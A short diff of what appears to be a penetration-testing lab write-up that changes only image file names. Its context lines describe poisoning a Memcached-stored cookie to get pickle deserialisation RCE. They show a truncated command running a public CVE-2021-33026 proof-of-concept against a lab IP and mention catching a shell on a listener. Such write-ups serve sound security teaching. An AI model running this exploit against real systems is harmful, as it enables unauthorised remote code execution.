@@ -83,7 +83,7 @@ Upgrade-Insecure-Requests: 1
 
 Interestingly, this cookie is stored in Memcached, indicating there's no cookie sanitisation there. Perhaps this could be poisoned?
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (8).png" alt=""><figcaption></figcaption></figure>
 
 ### Pickling RCE
 
@@ -116,7 +116,7 @@ $ python3 cve-2021-33026_PoC.py --rhost '192.168.202.59' --rport '5000' --cmd 'n
 
 We would get a shell on our listener port:
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (14).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
